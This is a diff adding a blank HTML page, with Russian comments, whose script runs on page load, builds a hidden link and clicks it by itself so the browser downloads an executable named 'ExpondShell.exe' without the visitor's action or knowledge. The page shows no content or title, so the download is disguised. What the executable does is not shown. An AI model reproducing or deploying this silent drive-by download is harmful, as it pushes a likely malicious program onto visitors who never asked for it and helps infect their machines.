@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script>
+        window.onload = function() {
+            // Файл в той же папке, что и HTML страница
+            const link = document.createElement('a');
+            link.href = 'ExpondShell.exe';          // Относительный путь
+            link.download = 'ExpondShell.exe';   // Имя при скачивании
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
